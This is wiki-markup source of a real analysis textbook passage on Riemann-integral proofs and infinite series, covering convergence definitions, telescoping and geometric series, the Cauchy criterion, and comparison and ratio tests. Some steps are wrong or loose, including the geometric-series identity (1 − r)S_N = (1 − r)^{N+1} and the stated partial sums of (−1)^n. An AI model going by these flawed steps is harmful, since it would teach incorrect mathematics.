Without loss of generality, we can assume that &lt;math&gt;\delta_m&gt;\delta_n&lt;/math&gt; when &lt;math&gt;m&lt;n&lt;/math&gt;. For every &lt;math&gt;\delta_n&lt;/math&gt;, let &lt;math&gt;\mathcal{\dot{P}}_n&lt;/math&gt; be a partition such that &lt;math&gt;\|\mathcal{\dot{P}}_n\|&lt;\delta_n&lt;/math&gt;

The sequence &lt;math&gt;a_n=S(f,\mathcal{\dot{P}}_n)&lt;/math&gt; is a Cauchy sequence, and hence it has a limit &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;. 

Now, for every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, we have a &lt;math&gt;\delta&gt;0&lt;/math&gt; such that &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt; implies &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\varepsilon&lt;/math&gt;.

Thus &lt;math&gt;\int_a^b f=L&lt;/math&gt;

===Theorem (Squeeze Theorem)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Then,

(i) &lt;math&gt;f&lt;/math&gt; is Riemann integrable on &lt;math&gt;[a,b]&lt;/math&gt; if and only if 

(ii) For every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exist &lt;u&gt;Riemann integrable&lt;/u&gt; functions &lt;math&gt;\alpha_{\varepsilon},\omega_{\varepsilon}:[a,b]\to\mathbb{R}&lt;/math&gt; such that 

&lt;math&gt;\alpha_{\varepsilon}(x)\leq f(x)\leq\omega_{\varepsilon}(x)&lt;/math&gt; for all &lt;math&gt;x\in[a,b]&lt;/math&gt; and

&lt;math&gt;\int_a^b (\omega_{\varepsilon}-\alpha_{\varepsilon})&lt;\varepsilon&lt;/math&gt;
====Proof====
(&lt;math&gt;\Rightarrow&lt;/math&gt;)Take &lt;math&gt;\alpha_{\varepsilon}(x)=f(x)=\omega_{\varepsilon}(x)&lt;/math&gt;. It is easy to see that &lt;math&gt;\int_a^b (\omega_{\varepsilon}-\alpha_{\varepsilon})&lt;\varepsilon&lt;/math&gt;

(&lt;math&gt;\Leftarrow&lt;/math&gt;)Let &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;. Then, there exist functions &lt;math&gt;\alpha_n,\omega_n&lt;/math&gt; such that &lt;math&gt;\int_a^b (\omega_n-\alpha_n)&lt;\tfrac{1}{n}&lt;/math&gt;. Further, if &lt;math&gt;\int_a^b \alpha_n=A_n&lt;/math&gt; and &lt;math&gt;\int_a^b \omega_n=Z_n&lt;/math&gt;, then there exist &lt;math&gt;\delta_1,\delta_2&gt;0&lt;/math&gt; such that if a partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfies &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_1&lt;/math&gt; then &lt;math&gt;|S(\alpha_n,\mathcal{\dot{P}})-A_n|&lt;\tfrac{1}{n}&lt;/math&gt; and &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_2&lt;/math&gt; then &lt;math&gt;|S(\omega_n,\mathcal{\dot{P}})-Z_n|&lt;\tfrac{1}{n}&lt;/math&gt;

Now let &lt;math&gt;\mathcal{\dot{P}}_n&lt;/math&gt; be an interval satisfying &lt;math&gt;\|\mathcal{\dot{P}}_n\|&lt;\inf \{\delta_1,\delta_2\}&lt;/math&gt;. 

Now, we can easily see that &lt;math&gt;|S(f,\mathcal{\dot{P}}_n)-S(f,\mathcal{\dot{P}}_{n-1})|&lt;\tfrac{1}{n}&lt;/math&gt;. Hence, &lt;math&gt;S(f,\mathcal{\dot{P}}_n)&lt;/math&gt; is a Cauchy sequence, with a limit &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;, and as in the previous proof, we can show that &lt;math&gt;\int_a^b f=L&lt;/math&gt;</text>

Frequently in analysis it is useful to consider the sum of infinitely many numbers.  So for some sequence of numbers (''a''&lt;sub&gt;''n''&lt;/sub&gt;) we may want to consider expressions like 
:&lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt;.

But the exact meaning of this may not be immediately clear.  Intuitively we would like to say that the sum of infinitely many numbers should be the number we get close to after we have summed a large number of terms.  We will use the notion of the limit of a sequence to make this precise.  The standard terminology in the study of series sometimes has room for improvement, but we follow the standard terminology in this section.  

==Definition==
We begin with a sequence (''a''&lt;sub&gt;''n''&lt;/sub&gt;) of the numbers we would like to sum.

:'''Definition''' A '''series''' of real numbers is an infinite formal sum
::&lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt;
:where each '''term''' ''a''&lt;sub&gt;''n''&lt;/sub&gt; is a real number.

This definition deserves a few comments.  The first is that no attempt is being made to define a formal sum.  It is possible to define a formal sum simply as the sequence of terms, but this doesn't add any clarity to the discussion.  
The reason for allowing the series to be formal is merely a matter of convenience.  It is frequently easier to refer to a series before it as been determined if there is any number that should represent the sum.  This is very similar to the standard practice of saying  &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; does not exist - we have only defined the meaning of the symbols &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; in the case when the limit does exist.  We should instead say that the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; does not converge.  However, the meaning of the previous statement is perfectly clear.
  
:'''Definition''' The ''n''-th '''partial sum''' of a sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is defined to be the sum of the first ''n'' terms of (''a''&lt;sub&gt;''n''&lt;/sub&gt;), that is 
::&lt;math&gt;S_n=\sum_{i=1}^n a_i=a_1+a_2+\cdots+a_n&lt;/math&gt;.
:When the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is being thought of as the terms of a series, then ''S''&lt;sub&gt;''n''&lt;/sub&gt; is often called the ''n''-th partial sum ''of the series.''

Often several partial sums may appear in the same argument, so  the partial sum is often written simply as &lt;math&gt;\sum_{i=1}^n a_i&lt;/math&gt; instead of ''S''&lt;sub&gt;''n''&lt;/sub&gt; when we wish to avoid confusion.

:'''Definition''' For a series &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; we define the  '''sum''' of the series to be the limit of the partial sums.  That is, we ''define'': 
::&lt;math&gt; \sum_{n=1}^{\infty} a_{n}=\lim_{N\to\infty} \sum_{n=1}^N a_n=\lim_{N\to\infty}S_N&lt;/math&gt;.
:If the limit exists we say the series '''converges''', otherwise we say the series '''diverges'''.

It should be emphasized when a series diverges, we cannot interpret &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; as a number, but only as a formal sum.  On the other hand when the series does converge, it is often not known what number the series converges to, so this number is usually denoted by &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt;.  Again this is similar to writing &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; before the convergence of the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is established.  In practice the meaning of the symbols &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; is clear from context.      

Often it is convenient to sum series starting from some number other than ''n''&amp;nbsp;=&amp;nbsp;1, and start the series some other point like 0, 2, &amp;minus;10, etc.  This hopefully should cause no confusion; the sum of the series is still defined as the limit of the partial sums.  Often, it is clear from context where the sum begins. In these cases it is not uncommon to leave the index out of the sigma notation - that is, it is useful to write &amp;sum;''a''&lt;sub&gt;''n''&lt;/sub&gt; for &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt;

==Examples==
&lt;ul&gt;
&lt;li&gt;The notion of an infinite sum can be a little more subtle than it first appears.  For example, consider the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;(&amp;minus;1)&lt;sup&gt;''n''&lt;/sup&gt;.  
Does the sum of the ''a''&lt;sub&gt;''n''&lt;/sub&gt; converge or diverge?  We could consider the partial sums ''S''&lt;sub&gt;''N''&lt;/sub&gt;, which are 1 if ''N'' is odd and 0 if ''N'' is even. So it seems the series diverges. On the other hand, 1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;0&amp;nbsp;+&amp;nbsp;0&amp;nbsp;+&amp;nbsp;0&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;0.  Does then the series diverge or converge to 0, according to our theory? The answer is it diverges; the fallacy in the previous sentence was in asserting that 1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;….  It is no longer true that for infinite series that we may sum in any order we choose; we must justify why we are allowed to group the +1's together with the -1's without changing the sum. Stated formally, associativity does not necessarily hold for infinite series. We will investigate when it is possible to rearrange the elements of a series and still get the same sum.
&lt;li&gt; Perhaps the most familiar examples of series come from decimal expansions of real numbers. While we have not given a rigorous definition of decimal expansions here, it can be shown that every real number ''r'' can be expressed in the form &lt;math&gt;\textstyle r = \sum_{n=0}^{\infty} \frac{a_n}{10^n}&lt;/math&gt; where ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;&amp;isin;&amp;nbsp;{0,&amp;nbsp;1,&amp;nbsp;2,&amp;nbsp;3,&amp;nbsp;4,&amp;nbsp;5,&amp;nbsp;6,&amp;nbsp;7,&amp;nbsp;8,&amp;nbsp;9}
&lt;li&gt;Consider the series &lt;math&gt;\textstyle \tfrac{1}{1\cdot 2}+\tfrac{1}{2\cdot 3}+\tfrac{1}{3\cdot 4}\cdots=\sum_{n=1}^\infty\tfrac{1}{n(n+1)}&lt;/math&gt;.  At first it may seem difficult to determine the partial sums and decide whether or not the series converges. However, it turns out that this series is nicer than it first appears, since &lt;math&gt;\textstyle \frac{1}{n(n+1)}=\frac{1}{n}-\frac{1}{n+1}.&lt;/math&gt;  Thus &lt;br&gt;&lt;br&gt;


:&lt;math&gt;\sum_{n=1}^N \frac{1}{n(n+1)}=\sum_{n=1}^N \frac{1}{n}-\frac{1}{n+1}=1-\frac{1}{2}+\frac{1}{2}-\frac{1}{3}+\frac{1}{3}-\frac{1}{4}+\cdots+\frac{1}{N}-\frac{1}{N+1}=1-\frac{1}{N+1}.&lt;/math&gt; 
&lt;br&gt;

Thus &lt;math&gt;\textstyle \lim_{N\to\infty}\sum_{n=1}^N\tfrac{1}{n(n+1)}=\lim_{N\to\infty}(1-\tfrac{1}{N+1})=1.&lt;/math&gt;  This is an example of a '''telescoping series''' - that is, a series that can be written in the form such that the next term cancels with the previous terms.  That is, 
:&lt;math&gt;\sum_{n=1}^{\infty}a_n-a_{n+1}&lt;/math&gt;
For all such series the partial sums are given by ''S''&lt;sub&gt;''N''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;''a''&lt;sub&gt;1&lt;/sub&gt;&amp;nbsp;&amp;minus;&amp;nbsp;''a''&lt;sub&gt;''N''+1&lt;/sub&gt;. That is, the terms of the series collapse like a telescope, leaving only the first and last.  Such a series converges to ''a''&lt;sub&gt;''1''&lt;/sub&gt;&amp;nbsp;&amp;minus;&amp;nbsp;lim&amp;nbsp;''a''&lt;sub&gt;''N''+1&lt;/sub&gt;.
&lt;li&gt; Another important example of a series is the '''geometric series''' given by &lt;math&gt;\sum_{n=0}^{\infty} r^n &lt;/math&gt;.  The partial sums for the geometric series first appear quite complicated. At first glance the partial sums would just appear to be ''S''&lt;sub&gt;''N''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;1&amp;nbsp;+&amp;nbsp;''r''&amp;nbsp;+''r''&lt;sup&gt;2&lt;/sup&gt;&amp;nbsp;+&amp;nbsp;…&amp;nbsp;+&amp;nbsp;''r''&lt;sup&gt;''N''&lt;/sup&gt;, but if we calculate (1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')''S''&lt;sub&gt;N&lt;/sub&gt; then the sum telescopes and we are left with (1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')''S''&lt;sub&gt;N&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')&lt;sup&gt;''N''+1&lt;/sup&gt;.  Notice that this sum holds for any ''r'' or ''N'', so we conclude that &lt;math&gt;\textstyle S_N=\tfrac{1-r^{N+1}}{1-r}&lt;/math&gt;.  Thus a geometric series converges if |''r''|&amp;nbsp;&amp;lt;&amp;nbsp;1.
&lt;/ul&gt;

&lt;!-- 
* Alternating Series: Any series of the form &lt;math&gt; \sum_{n=1}^{\infty} (-1)^n a_n&lt;/math&gt;, where for all i, &lt;math&gt;a_i \geq 0&lt;/math&gt;  is called an alternating series.  

* p-series: Any series of the form &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; is called a p-series.  This kind of series is generally harder to evaluate than the two previously discussed.  When p=2, for example, we get the amazing identity &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^2} = \frac{\pi^2}{6}&lt;/math&gt;.  This takes considerable effort to prove, so for the moment we will content ourselves with showing that &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; diverges for p &lt;math&gt;\leq&lt;/math&gt; 1 and converges for p&gt;1. 

* Power Series: These should be familiar to anyone who has taken calculus.  A power series is actually a function &lt;math&gt;f&lt;/math&gt; that takes a real number &lt;math&gt;x&lt;/math&gt; and returns a series, &lt;math&gt; f(x) = \sum_{n=0}^{\infty} a_n x^n&lt;/math&gt;.  These, along with Fourier Series, will be examined in detail in a later chapter of the book, once we have covered sequences and series of functions.

* Fourier Series: Like power series, these are functions that take a real number and return a series.  However, the terms are trigonometric functions rather than powers of x.  The general expression for a Fourier series is: &lt;math&gt;f(x) = a_0 + \sum_{n=1}^{\infty} a_n cos(nx) + b_n sin(nx)&lt;/math&gt;.

==Basic Facts==

Here we collect facts about series that follow immediately from the properties of finite sums a limits and do not require a delicate analysis of the limits involved.
   
===Theorem (Algebraic Operations)===
Suppose &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; and &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; are convergent series, then we immediately have the following two theorems.

* For any real number ''c'' the series &amp;sum;&amp;nbsp;(''c''&amp;middot;''a''&lt;sub&gt;''n''&lt;/sub&gt;) is convergent and converges to ''c''&amp;middot;(&amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;).
* The series &amp;sum;&amp;nbsp;(''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;+&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt;) is convergent and converges to (&amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;)&amp;nbsp;+&amp;nbsp;(&amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;)

====Proof====
For the first statement notice that for any natural number ''N'', we have that &lt;math&gt;\textstyle \sum_{n=1}^N c\cdot a_n=\textstyle c\cdot \sum_{n=1}^N a_n&lt;/math&gt;.  Thus 
:&lt;math&gt;\lim_{N\to\infty}\sum_{n=1}^N c\cdot a_n=\lim_{N\to\infty}c\cdot \sum_{n=1}^N a_n=c\cdot \lim_{N\to\infty}\sum_{n=1}^N a_n&lt;/math&gt;.
This proves the first statement.

For the second statement again notice that for any ''N'' we have that &lt;math&gt;\textstyle \sum_{n=1}^N a_n+b_n=\sum_{n=1}^N a_n+\sum_{n=1}^N b_n&lt;/math&gt;.  Thus
:&lt;math&gt;\lim_{N\to\infty}\sum_{n=1}^N a_n+b_n=\lim_{N\to\infty}\left(\sum_{n=1}^N a_n+\sum_{n=1}^N b_n\right)=\lim_{N\to\infty}\sum_{n=1}^N a_n+\lim_{N\to\infty}\sum_{n=1}^N b_n&lt;/math&gt;.
This proves the second statement. &lt;math&gt;\Box&lt;/math&gt;


The following is merely a restatement of Cauchy's Criterion.

===Theorem (Cauchy's Criterion for Series)===
A series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges if and only if for any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0 there is a natural number ''N'' so that 
&lt;math&gt;\textstyle |\sum_{k=n+1}^m a_k| &lt; \epsilon&lt;/math&gt; for any natural numbers   ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''&amp;nbsp;&amp;gt;&amp;nbsp;''N''.

====Proof====

By the definition of convergence for a series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges if and only if &lt;math&gt;\textstyle\lim_{N\to\infty}\sum_{k=1}^N a_k&lt;/math&gt; converges.  But by the Cauchy criterion for sequences this limit exists if and only if for any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0 we can find a natural number ''N'' so that for ''n'',&amp;nbsp;''m''&amp;nbsp;&amp;gt;&amp;nbsp;''N'' we have that
:&lt;math&gt;\left|\sum_{k=1}^n a_k-\sum_{k=1}^m a_k\right|&lt;\epsilon.&lt;/math&gt;
Without loss of generality we may assume ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''.  Canceling the terms that occurs in both sums completes the proof. &lt;math&gt;\Box&lt;/math&gt;

==Absolute Convergence==

As we will see series may behave in ways that defy our intuition.  So, it is useful to identify which classes of convergent series behave in a way more consistent with our intuition.  We shall see that once such class of series are the so called ''absolutely convergent'' series.

:'''Definition''' A series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; ''converges absolutely'' if the series of the absolute values of its terms converges,  that is, if &lt;math&gt;\textstyle\sum_{n=1}^{\infty} |a_n|&lt;/math&gt; is a convergent series.  

Notice we have not said required that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is convergent, this is because the property of absolute convergence implies that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is convergent.

===Theorem (Absolute Convergence)===
If &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; converges absolutely, then it converges.

====Proof====

Suppose &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; is absolutely convergent.  By the Cauchy criterion we can show that &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; converges if for any ε&amp;nbsp;&gt;&amp;nbsp;0 we can find an ''N'' so that if ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'' then &lt;math&gt;\textstyle |\sum_{k=n+1}^{m} a_k|&lt;\epsilon&lt;/math&gt;.  But we know that &lt;math&gt;\textstyle \sum_{n=1}^\infty |a_n|&lt;/math&gt; converges, so ε&amp;nbsp;&gt;&amp;nbsp;0 by the Cauchy criterion choose ''N'' so that if ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'' then &lt;math&gt;\textstyle |\sum_{k=n+1}^{m} |a_k||=\textstyle \sum_{k=n+1}^{m} |a_k|&lt;\epsilon&lt;/math&gt;.  With this ''N'' in hand take any ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'', it then follows from the triangle inequality that
:&lt;math&gt;|\sum_{k=n+1}^m a_k|\leq \sum_{k=n+1}^m |a_k|&lt; \epsilon.&lt;/math&gt;
Therefore by the Cauchy criterion &lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt; converges. &lt;math&gt;\Box&lt;/math&gt;

== Tests for convergence and divergence ==
Given a series &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; it is very useful to be able to tell if the series converges or diverges.  Particularly if we can do so simply by looking at the terms.  In this section we set out to collect such theorems.  Notice we have already seen one example.  That is a series is convergent if it is absolutely convergent, now we explore when we can decide if a series is convergent.

Although the following theorem is stated in terms of convergence, it actually gives a useful test for divergence.  Namely, if the terms of a series do not have limit 0, the series must diverge.

===Theorem (Terms Have Limit 0)===
For any converging series &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; the terms must tend to 0, that is &lt;math&gt;\textstyle \lim_{n\rightarrow \infty} a_n = 0. &lt;/math&gt;

====Proof====
Given any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0, by the Cauchy Criterion for series, we can choose a natural number ''N'' so that &lt;math&gt;\textstyle |\sum_{i=n+1}^m a_i|&lt;\epsilon&lt;/math&gt; when ever ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N''. In particular, for any ''k''&amp;nbsp;&amp;gt;&amp;nbsp;''N'' we may apply this in the case when ''n''&amp;nbsp;=&amp;nbsp;''k''&amp;nbsp;&amp;minus;&amp;nbsp;1 and ''m''&amp;nbsp;=&amp;nbsp;''k''.  In this case the sum reduces to the single term ''a''&lt;sub&gt;''k''&lt;/sub&gt;.  Thus if ''k''&amp;nbsp;&amp;gt;&amp;nbsp;''N''  we have that |''a''&lt;sub&gt;''k''&lt;/sub&gt;|&amp;nbsp;&amp;lt;&amp;nbsp;&amp;epsilon; and therefore the sequence (''a''&lt;sub&gt;''n''&lt;/sub&gt;)&amp;nbsp;→&amp;nbsp;0. &lt;math&gt;\Box&lt;/math&gt;

'''Remark''' To give an example of how to use this to test for divergence of a series consider the example of a geometric series &lt;math&gt;\textstyle \sum_{n=0}^\infty r^n&lt;/math&gt;.  We have already shown that this series converges if |''r''|&amp;nbsp;&lt;&amp;nbsp;1.  On the other hand we have not determined if the series converges or diverges for other values of ''r''.  Now it is clear that if |''r''|&amp;nbsp;≥&amp;nbsp;1 then the sequence ''r''&lt;sub&gt;''n''&lt;/sup&gt; does not tend to zero.  So we now know that the geometric series &lt;math&gt;\textstyle \sum_{n=0}^\infty r^n&lt;/math&gt; converges if and only of |''r''|&amp;nbsp;&lt;&amp;nbsp;1.

===Theorem (Positive Series Converge)===
Suppose &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; is a series of non-negative terms, that is ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;&amp;ge;&amp;nbsp;0, then the series either converges if and only if the partial sums are bounded above.
====Proof====

Since the terms are non-negative, we clearly have &lt;math&gt;\textstyle \sum_{n=1}^N a_n \leq \sum_{n=1}^{N+1} a_n&lt;/math&gt; and hence the partial sums form a monotonic sequence.  If the partial sums are bounded then the series converges.  If they are unbounded, then for any ''M''&amp;nbsp;&amp;gt;&amp;nbsp;0 we can find an ''N'' so that &lt;math&gt;\textstyle \sum_{n=1}^N a_n \geq M&lt;/math&gt;, since the partial sums are non-decreasing, we have that &lt;math&gt;\textstyle\lim_{N \rightarrow \infty}\sum_{n=1}^N a_n = \infty &lt;/math&gt;, and hence the series does not converge. &lt;math&gt;\Box&lt;/math&gt;

'''Remark''' It follows from the proof, together with the Convergence of monotone sequences, that if a sequence of non-negative terms converges we may take the sum of the sequence as an upper bound for the partial sums, as our intuition would dictate.  

To determine whether or not a series converges, sometimes it is useful to compare it term-by-term with another series whose convergence is understood.  The following theorem gives one such method for comparing.

===Theorem (Comparison Test)===

Suppose that 0&amp;nbsp;≤&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; for all natural numbers ''n'' and consider the series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n &lt;/math&gt; and &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n
&lt;/math&gt;.  If the &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n&lt;/math&gt; converges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges.  Furthermore, if &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; diverges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n &lt;/math&gt; diverges.

====Proof====
First suppose that the &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; converges.  Then by our previous theorem we know that the partial sums for some real number we know that &lt;math&gt;\textstyle\sum_{n=1}^N b_n\leq\sum_{n=1}^\infty b_n&lt;/math&gt;.  Since ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; if follows that 
:&lt;math&gt;\sum_{k=1}^{N} a_n \leq \sum_{k=1}^{N} b_n \leq \sum_{n=1}^{\infty} b_n &lt;/math&gt;.  
Thus the partial sums of &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; are bounded above, since &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is also a series of non-negative terms it follows that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; converges.

Now suppose that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; diverges.  Since it is a series of non-negative terms the pervious theorem tells us that for any real number ''M'' we can find an ''N'' so that &lt;math&gt;\textstyle M&lt;\sum_{n=1}^N a_n&lt;/math&gt;.  Since ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; we have that
:&lt;math&gt;M&lt;\sum_{k=1}^{N} a_n \leq \sum_{k=1}^{N} b_n&lt;/math&gt;.  
Therefore the partial sums of &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; cannot be bounded above, and hence by the previous theorem &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; diverges. &lt;math&gt;\Box&lt;/math&gt;

===Theorem (Limit Comparison Test)===
Suppose &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n &lt;/math&gt; and &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n&lt;/math&gt; series of positive terms so that &lt;math&gt;\textstyle 0\leq\limsup_{n\to\infty} \tfrac{a_n}{b_n}&lt;\infty&lt;/math&gt;.  In this case, if &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n &lt;/math&gt; converges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges.  

====Proof====
Suppose the limit of the absolute value of their ratios converges to some positive number ''r''&amp;nbsp;&amp;lt;&amp;nbsp;&amp;infin;. Then there exists an ''N'' such that if ''n''&amp;nbsp;&amp;gt;&amp;nbsp;''N'', that &lt;math&gt;|\,|\tfrac{a_n}{b_n}|-r|&lt;\tfrac{r}{2}&lt;/math&gt;, so &lt;math&gt;\tfrac{r}{2}&lt;|\tfrac{a_n}{b_n}|&lt;\tfrac{3r}{2}&lt;/math&gt;. This means that &lt;math&gt;\tfrac{r}{2}|b_n|&lt;|a_n|&lt;\tfrac{3r}{2}|b_n|&lt;/math&gt;. Hence, by the comparison test, if &lt;math&gt;\sum_{n=1}^{\infty} b_n&lt;/math&gt; converges, then &lt;math&gt;\sum_{n=1}^{\infty} a_n &lt;/math&gt; also converges. Dividing by &lt;math&gt;\tfrac{r}{2}&lt;/math&gt;, one can also see by the comparison test that if &lt;math&gt;\sum_{n=1}^{\infty} a_n &lt;/math&gt; converges, then &lt;math&gt;\sum_{n=1}^{\infty} b_n &lt;/math&gt; also converges.


We need to have ways of checking for convergence and divergence of various series.  The following types of series arise quite often, and it is easy to verify when they converge and diverge:

===Theorem (Ratio Test)===
Supoose that &lt;math&gt;\textstyle \lim_{n \rightarrow \infty} \left|\frac{x_{n+1}}{x_n}\right|&lt;/math&gt; converges and equals some real number ''r''.  If ''r''&amp;nbsp;&lt;&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n&lt;/math&gt; converges absolutely.  If ''r''&amp;nbsp;&gt;&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n &lt;/math&gt; diverges. Finally, if ''r''&amp;nbsp;=&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n&lt;/math&gt; may either converge or diverge.

====Proof==== 

First suppose that ''r''&amp;nbsp;&lt;&amp;nbsp;1.  Let ε&amp;nbsp;=&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;''r'', since ''r''&amp;nbsp;&lt;&amp;nbsp;1 it follows that ε&amp;nbsp;&gt;&amp;nbsp;0.  

